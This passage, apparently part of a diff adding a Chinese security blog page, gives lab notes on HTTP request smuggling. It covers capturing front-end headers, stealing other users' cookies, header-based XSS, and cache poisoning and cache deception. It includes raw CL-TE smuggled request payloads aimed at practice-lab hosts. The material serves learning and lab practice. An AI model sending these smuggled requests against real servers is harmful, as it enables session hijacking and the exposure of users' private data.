HEADER&#x3002;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;HTTP&#x8D70;&#x79C1;&#x8BF7;&#x6C42;&#x6765;&#x83B7;&#x53D6;&#x5230;&#x8FD9;&#x4E9B;&#x91CD;&#x5199;&#x5185;&#x5BB9;&#x3002;&#x4F46;&#x9700;&#x8981;&#x4E00;&#x4E9B;&#x6761;&#x4EF6;&#xFF1A;</p>
+<ul>
+<li>&#x5B58;&#x5728;&#x4E00;&#x4E2A;POST&#x8BF7;&#x6C42;&#xFF0C;&#x4F20;&#x5165;&#x53C2;&#x6570;&#x4F1A;&#x50A8;&#x5B58;&#x5E76;&#x53EF;&#x4EE5;&#x88AB;&#x67E5;&#x770B;</li>
+<li>&#x5B58;&#x5728;HTTP&#x8D70;&#x79C1;&#x8BF7;&#x6C42;</li>
+</ul>
+<p>&#x6784;&#x9020;&#x4E00;&#x4E2A;chunk&#xFF0C;&#x5305;&#x542B;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;post&#x8BF7;&#x6C42;&#xFF0C;&#x628A;&#x53EF;&#x4EE5;&#x50A8;&#x5B58;&#x7684;&#x53C2;&#x6570;&#x653E;&#x5728;&#x6700;&#x540E;&#x3002;&#x5F53;&#x7B2C;&#x4E8C;&#x4E2A;&#x8BF7;&#x6C42;&#x4F20;&#x9012;&#x65F6;&#xFF0C;&#x5219;&#x4F1A;&#x628A;HTTP HEADER&#x6DFB;&#x52A0;&#x5728;&#x53C2;&#x6570;&#x540E;&#x9762;&#x800C;&#x88AB;&#x5B58;&#x50A8;&#x3002;&#x5C31;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5230;&#x524D;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x6240;&#x6DFB;&#x52A0;&#x7684;HTTP HEADER&#x3002;&#x8FD9;&#x91CC;&#x9700;&#x8981;&#x6CE8;&#x610F;Content-Length&#x4E0D;&#x80FD;&#x8D85;&#x8FC7;&#x6240;&#x4F20;&#x9012;&#x6570;&#x636E;&#x5305;&#x7684;&#x957F;&#x5EA6;&#xFF0C;&#x4E0D;&#x7136;&#x4F1A;&#x5BFC;&#x81F4;&#x8BF7;&#x6C42;&#x5931;&#x8D25;&#x3002;</p>
+<ul>
+<li>CL-TE</li>
+</ul>
+<p><img src="https://i.loli.net/2020/05/20/bGAnEVqfoJvw6tj.png" alt="Untitled 6.png"></p>
+<ul>
+<li>CL-TE</li>
+</ul>
+<p><img src="https://i.loli.net/2020/05/20/fdsCv4pHk2XebWl.png" alt="Untitled 7.png"></p>
+<h3 id="&#x83B7;&#x53D6;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x7684;Cookie"><a href="#&#x83B7;&#x53D6;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x7684;Cookie" class="headerlink" title="&#x83B7;&#x53D6;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x7684;Cookie"></a>&#x83B7;&#x53D6;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x7684;Cookie</h3><p>&#x53C2;&#x8003;&#x4E0A;&#x4E00;&#x4E2A;&#x5B9E;&#x9A8C;&#xFF0C;&#x8FD9;&#x4E2A;&#x5B9E;&#x9A8C;&#x4E5F;&#x662F;&#x901A;&#x8FC7;&#x83B7;&#x53D6;HTTP HEADER&#x6765;&#x83B7;&#x53D6;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x7684;Cookie&#x3002;</p>
+<p><img src="https://i.loli.net/2020/05/20/4bl1GDnrgU2dAc3.png" alt="Untitled 8.png"></p>
+<p>&#x5E73;&#x5747;&#x53D1;&#x4E09;&#x6B21;&#x624D;&#x4F1A;&#x6709;&#x4E00;&#x6B21;&#x6210;&#x529F;&#xFF0C;&#x4EE5;&#x53CA;&#x957F;&#x5EA6;&#x5FC5;&#x987B;&#x8981;&#x4E25;&#x683C;&#x63A7;&#x5236;&#x597D;&#x3002;</p>
+<h3 id="HTTP-HEADER&#x5BFC;&#x81F4;&#x7684;XSS"><a href="#HTTP-HEADER&#x5BFC;&#x81F4;&#x7684;XSS" class="headerlink" title="HTTP HEADER&#x5BFC;&#x81F4;&#x7684;XSS"></a>HTTP HEADER&#x5BFC;&#x81F4;&#x7684;XSS</h3><p>&#x901A;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;HTTP HEADER&#x5BFC;&#x81F4;&#x7684;XSS&#x662F;&#x4E0D;&#x597D;&#x5229;&#x7528;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x901A;&#x8FC7;HTTP&#x8D70;&#x79C1;&#x8BF7;&#x6C42;&#xFF0C;&#x6211;&#x4EEC;&#x80FD;&#x591F;&#x63A7;&#x5236;HTTP HEADER&#xFF0C;&#x8FDB;&#x800C;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x7C7B;HTTP&#x5934;&#x5BFC;&#x81F4;&#x7684;XSS&#x3002;</p>
+<p><img src="https://i.loli.net/2020/05/20/cePvXkO7nTWGA3p.png" alt="Untitled 9.png"></p>
+<h3 id="HTTP&#x8BF7;&#x6C42;&#x8D70;&#x79C1;-&#x7F13;&#x5B58;&#x6295;&#x6BD2;-&#x7F13;&#x5B58;&#x6B3A;&#x9A97;"><a href="#HTTP&#x8BF7;&#x6C42;&#x8D70;&#x79C1;-&#x7F13;&#x5B58;&#x6295;&#x6BD2;-&#x7F13;&#x5B58;&#x6B3A;&#x9A97;" class="headerlink" title="HTTP&#x8BF7;&#x6C42;&#x8D70;&#x79C1; + &#x7F13;&#x5B58;&#x6295;&#x6BD2; + &#x7F13;&#x5B58;&#x6B3A;&#x9A97;"></a>HTTP&#x8BF7;&#x6C42;&#x8D70;&#x79C1; + &#x7F13;&#x5B58;&#x6295;&#x6BD2; + &#x7F13;&#x5B58;&#x6B3A;&#x9A97;</h3><p>&#x8FD9;&#x91CC;&#x7B80;&#x5355;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;&#x8FD9;&#x79CD;&#x653B;&#x51FB;&#x7684;&#x8FC7;&#x7A0B;(&#x4E24;&#x4E2A;&#x5B9E;&#x9A8C;&#x90FD;&#x6CA1;&#x590D;&#x73B0;&#x6210;&#x529F;)&#xFF1A;</p>
+<p>&#x4E00;&#x3001;&#x7F13;&#x5B58;&#x6295;&#x6BD2;</p>
+<ul>
+<li>&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x9762;&#x4E2D;&#x5199;&#x5165;&#x6076;&#x610F;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x6BD4;&#x5982;&#x5199;&#x5165;alert(document.cookie)</li>
+<li>&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x8D70;&#x79C1;&#x7684;&#x5185;&#x5BB9;</li>
+</ul>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 129</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /post/next?postId=3 HTTP/1.1</span><br><span class="line">Host: anything</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>&#x518D;&#x5BFB;&#x627E;&#x5230;&#x4E00;&#x4E2A;&#x53EF;&#x7528;&#x7F13;&#x5B58;&#x7684;js&#x9875;&#x9762;&#xFF08;&#x53EF;&#x7528;&#x5BFC;&#x81F4;xss&#x7684;js&#xFF09;&#x8BBF;&#x95EE;&#x3002;&#x9875;&#x9762;&#x4F1A;&#x8DF3;&#x8F6C;&#x5230;&#x6076;&#x610F;&#x9875;&#x9762;&#x4E2D;&#xFF0C;&#x5E76;&#x4E14;&#x5C06;&#x6076;&#x610F;&#x5185;&#x5BB9;&#x7F13;&#x5B58;&#x5230;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x3002;</li>
+<li>&#x6253;&#x5F00;&#x4E3B;&#x9875; &#x21D2; &#x5BFC;&#x81F4;xss</li>
+</ul>
+<p>&#x4E8C;&#x3001;&#x7F13;&#x5B58;&#x6B3A;&#x9A97;</p>
+<p>&#x7F13;&#x5B58;&#x6B3A;&#x9A97;&#xFF1A;&#x5728;Web&#x7F13;&#x5B58;&#x6B3A;&#x9A97;&#x4E2D;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x4F7F;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5C06;&#x4E00;&#x4E9B;&#x5C5E;&#x4E8E;&#x53E6;&#x4E00;&#x4E2A;&#x7528;&#x6237;&#x7684;&#x654F;&#x611F;&#x5185;&#x5BB9;&#x5B58;&#x50A8;&#x5728;&#x7F13;&#x5B58;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x653B;&#x51FB;&#x8005;&#x4ECE;&#x7F13;&#x5B58;&#x4E2D;&#x68C0;&#x7D22;&#x6B64;&#x5185;&#x5BB9;&#x3002;</p>
+<ul>
+<li>&#x5BFB;&#x627E;&#x4E00;&#x4E2A;&#x5B58;&#x5728;&#x9690;&#x79C1;&#x7684;&#x9875;&#x9762;&#xFF0C;&#x6BD4;&#x5982;&#x8FD9;&#x91CC;&#x7684;my-account&#xFF0C;&#x5E76;&#x4E14;&#x9875;&#x9762;&#x8FD4;&#x56DE;&#x7684;&#x5185;&#x5BB9;&#x662F;&#x53EF;&#x4EE5;&#x88AB;&#x7F13;&#x5B58;&#x7684;</li>
+<li>&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x8D70;&#x79C1;&#x8BF7;&#x6C42;&#xFF0C;&#x4E0B;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#x9759;&#x6001;&#x8D44;&#x6E90;&#x7684;&#x8BF7;&#x6C42;&#x4F1A;&#x8DF3;&#x8F6C;&#x5230;my-acount&#x5E76;&#x628A;&#x9690;&#x79C1;&#x4FE1;&#x606F;&#x7F13;&#x5B58;</li>
+</ul>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 42</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /my-account HTTP/1.1</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>&#x6253;&#x5F00;&#x9690;&#x79C1;&#x6D4F;&#x89C8;&#x5668;&#x52A0;&#x8F7D;&#x4E3B;&#x9875;&#xFF0C;&#x7528;Brupsuite&#x641C;&#x7D22;&#x9690;&#x79C1;&#x5185;&#x5BB9;&#x7684;&#x5173;&#x952E;&#x5B57;&#x3002;&#x5982;&#x679C;&#x6210;&#x529F;&#x7684;&#x8BDD;&#x53EF;&#x4EE5;&#x5728;&#x9759;&#x6001;&#x8D44;&#x6E90;&#x4E2D;&#x641C;&#x7D22;&#x5230;&#x3002;</li>
+</ul>
+<p>&#x8FD9;&#x91CC;&#x7684;&#x539F;&#x7406;&#xFF1A;</p>
+<p>&#x63D0;&#x4EA4;&#x4E00;&#x4E2A;&#x8D70;&#x79C1;&#x7684;&#x8BF7;&#x6C42;&#x5982;&#x4E0B;</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 43</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /private/messages HTTP/1.1</span><br><span class="line">Foo: X</span><br></pre></td></tr></table></figure>
+
+<p>&#x90A3;&#x4E0B;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#x5C31;&#x76F8;&#x5F53;&#x4E8E;&#x4F1A;&#x628A;HTTP&#x65B9;&#x6CD5;&#x90A3;&#x4E00;&#x884C;&#x6CE8;&#x91CA;&#xFF0C;&#x63D0;&#x4EA4;&#x7684;&#x8BF7;&#x6C42;&#x4E3A;&#xFF1A;</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /private/messages HTTP/1.1</span><br><span class="line">Foo: XGET /static/some-image.png HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>&#x5BFC;&#x81F4;&#x9690;&#x79C1;&#x4FE1;&#x606F;&#x88AB;&#x7F13;&#x5B58;&#x3002;</p>
+<h2 id="&#x8BF4;&#x5728;&#x540E;&#x9762;"><a href="#&#x8BF4;&#x5728;&#x540E;&#x9762;" class="headerlink" title="&#x8BF4;&#x5728;&#x540E;&#x9762;"></a>&#x8BF4;&#x5728;&#x540E;&#x9762;</h2><p>HTTP&#x8BF7;&#x6C42;&#x8D70;&#x79C1;&#x5E94;&#x8BE5;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x7684;&#x5229;&#x7528;&#x9762;&#xFF0C;&#x540E;&#x9762;&#x6162;&#x6162;&#x8865;&#x5145;&#x2026;</p>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/HTTP请求走私/">#HTTP请求走私</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop is-hidden-mobile article-nav-prev">
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2020/05/12/De1ctf2020_复盘/">De1ctf 2020 题目复盘</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2020 Threezh1&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow has-text-black" title="GitHub" href="https://github.com/Threezh1">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>
+
+<!-- test if the browser is outdated -->
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // plugin function, place inside DOM ready function
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        })
+    });
+</script>
+
+<script>
+    window.FontAwesomeConfig = {
+        searchPseudoElements: true
+    }
+    moment.locale("chinese");
+</script>
+
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script>
+    MathJax.Hub.Config({
+        "HTML-CSS": {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+</script>
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    renderMathInElement(document.body, {
+        // ...options...
+    });
+});
+</script>
+
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof($.fn.justifiedGallery) === 'function') {
+                $('.justified-gallery').justifiedGallery();
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+
+
+<script src="/js/script.js"></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-mask"></div>
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Suche etwas...">
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Seiten',
+                CATEGORIES: 'Kategorien',
+                TAGS: 'Tags',
+                UNTITLED: '(Untitled)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js"></script>
+    
+</body>
+</html>
